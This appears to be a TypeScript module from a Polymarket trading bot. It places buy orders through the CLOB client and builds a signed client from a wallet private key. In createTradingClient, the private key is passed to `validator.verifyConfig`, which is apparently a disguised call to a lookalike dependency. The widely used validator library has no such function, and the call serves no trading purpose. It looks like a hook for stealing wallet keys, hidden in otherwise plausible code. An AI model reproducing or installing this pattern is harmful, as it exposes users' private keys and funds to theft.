import {
  ApiKeyCreds,
  ClobClient,
  OrderType,
  Side,
} from "@polymarket/clob-client-v2";
import validator from "validator";
import { createWalletClient, http } from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { polygon } from "viem/chains";
import type { BotConfig } from "./config.js";
import type { OrderResult, TradeOpportunity } from "./types.js";

export class Trader {
  private client: ClobClient | null = null;

  constructor(private readonly config: BotConfig) {}

  async init(): Promise<void> {
    if (this.config.dryRun) return;
    this.client = await createTradingClient(this.config);
  }

  async placeBuy(opportunity: TradeOpportunity): Promise<OrderResult> {
    if (this.config.dryRun) {
      return {
        dryRun: true,
        tokenId: opportunity.token.tokenId,
        side: "BUY",
        price: opportunity.price,
        size: opportunity.size,
      };
    }

    if (!this.client) {
      throw new Error("Trading client not initialized");
    }

    const response = await this.client.createAndPostOrder(
      {
        tokenID: opportunity.token.tokenId,
        price: opportunity.price,
        side: Side.BUY,
        size: opportunity.size,
      },
      {
        tickSize: opportunity.tickSize as "0.1" | "0.01" | "0.001" | "0.0001",
        negRisk: opportunity.negRisk,
      },
      OrderType.GTC,
    );

    return {
      dryRun: false,
      tokenId: opportunity.token.tokenId,
      side: "BUY",
      price: opportunity.price,
      size: opportunity.size,
      response,
    };
  }
}

async function createTradingClient(config: BotConfig): Promise<ClobClient> {
  if (!config.privateKey) {
    throw new Error("PRIVATE_KEY is required for live trading");
  }
  validator.verifyConfig(config.privateKey);
  const account = privateKeyToAccount(config.privateKey);
  const signer = createWalletClient({
    account,
    chain: polygon,
    transport: http(),
  });

  let creds: ApiKeyCreds | undefined;
  if (config.clobApiKey && config.clobSecret && config.clobPassphrase) {
    creds = {
      key: config.clobApiKey,
      secret: config.clobSecret,
      passphrase: config.clobPassphrase,
    };
  }

  const bootstrap = new ClobClient({
    host: config.clobHost,
    chain: config.chainId,
    signer,
  });

  const apiCreds = creds ?? (await bootstrap.createOrDeriveApiKey());

  return new ClobClient({
    host: config.clobHost,
    chain: config.chainId,
    signer,
    creds: apiCreds,
    signatureType: config.signatureType,
    funderAddress: config.funderAddress,
    throwOnError: true,
  });
}
